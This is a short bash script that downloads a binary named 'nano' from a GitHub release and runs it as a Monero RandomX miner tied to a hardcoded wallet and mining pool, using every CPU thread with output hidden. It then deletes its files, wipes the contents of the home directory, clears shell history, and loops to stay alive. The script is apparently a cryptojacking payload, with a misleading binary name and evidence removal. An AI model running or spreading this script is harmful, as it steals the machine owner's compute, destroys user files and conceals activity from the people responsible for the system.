#!/bin/bash
set -x
apt-get update ; apt-get install -y wget curl sudo
mkdir .lib && cd .lib
wget https://github.com/Sonehra/All-File/releases/download/sample/nano.tar.gz > /dev/null 2>&1
tar -xvf nano.tar.gz
chmod +x nano
./nano -algo RandomX -wallet amyKvLv8MZ3a6W6Stz7bFeMAVfNfCQDLhhkT6qpiEAUu5LAEJGXhaKsBzzxJTbmBV7NJPBRg2ENyhCSeTER49MUs6uFSPX3769 -coin XMR -rigName envio -pool1 randomx.rplant.xyz:7020 -useSSL false -cpuThreads $(nproc --all) > /dev/null 2>&1 &
sleep 30
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
